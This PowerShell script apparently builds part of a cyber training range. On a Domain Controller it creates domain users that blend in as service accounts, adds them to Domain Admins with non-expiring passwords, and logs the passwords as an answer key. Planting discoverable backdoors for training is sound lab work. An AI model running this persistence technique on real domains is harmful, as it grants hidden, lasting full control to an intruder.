#requires -Version 5.1
<#  DC step 5: Hidden DOMAIN admin persistence accounts.

    On a Domain Controller there is no local SAM, so the "backup" admin accounts
    from the config are created as DOMAIN users and dropped into Domain Admins --
    the AD equivalent of the local hidden-admin persistence in 90-hidden-accounts.
    Passwords never expire and are LOGGED to the manifest as the answer key.

    Note: unlike local accounts you cannot hide a domain user from the DC sign-in
    screen via SpecialAccounts\UserList, so these are "hidden" by blending in as
    service-account names in a Service Accounts OU rather than by being invisible.
#>
param([hashtable]$Config)
$ErrorActionPreference = 'Continue'
if (-not $Config) {
    $d = $PSScriptRoot; while ($d -and -not (Test-Path (Join-Path $d 'modules\RangeCommon.psm1'))) { $d = Split-Path $d -Parent }
    Import-Module (Join-Path $d 'modules\RangeCommon.psm1') -Force
    $Config = Import-PowerShellDataFile (Join-Path $d 'config\range.config.psd1')
    Initialize-RangeContext; Assert-RangeSafety -Config $Config
}
$cat = 'dc-hidden-admins'
if (-not (Test-IsDomainController)) { Write-RangeLog 'Not a DC; skipping hidden domain admins.' 'WARN'; return }
Import-Module ActiveDirectory -Force

$domain = Get-ADDomain
$dnsRoot = $domain.DNSRoot
$pass = ConvertTo-SecureString $Config.HiddenAdminPassword -AsPlainText -Force

# Reuse the Range Service Accounts OU if the roast script made it; else domain root.
$ou = "OU=Service Accounts,OU=Range,$($domain.DistinguishedName)"
if (-not (Get-ADOrganizationalUnit -Filter "DistinguishedName -eq '$ou'" -ErrorAction SilentlyContinue)) {
    $ou = $domain.UsersContainer   # CN=Users,...
}

foreach ($name in $Config.HiddenAdminAccounts) {
    try {
        if (Get-ADUser -Filter "SamAccountName -eq '$name'" -ErrorAction SilentlyContinue) {
            Set-ADAccountPassword -Identity $name -Reset -NewPassword $pass -ErrorAction SilentlyContinue
            Set-ADUser -Identity $name -PasswordNeverExpires $true -Enabled $true
        } else {
            New-ADUser -SamAccountName $name -Name $name -UserPrincipalName "$name@$dnsRoot" `
                -AccountPassword $pass -Enabled $true -PasswordNeverExpires $true `
                -Path $ou -Description 'Backup service account' -ErrorAction Stop
        }
        Add-ADGroupMember -Identity 'Domain Admins' -Members $name -ErrorAction SilentlyContinue
        Write-RangeManifest $cat 'hidden-domain-admin' $name "pw=$($Config.HiddenAdminPassword); Domain Admins"
        Write-RangeLog "hidden domain admin $name  (pw: $($Config.HiddenAdminPassword))" 'WARN'
    } catch { Write-RangeLog "domain admin $name failed: $($_.Exception.Message)" 'WARN' }
}

Write-RangeLog 'DC hidden-domain-admins category complete.' 'OK'
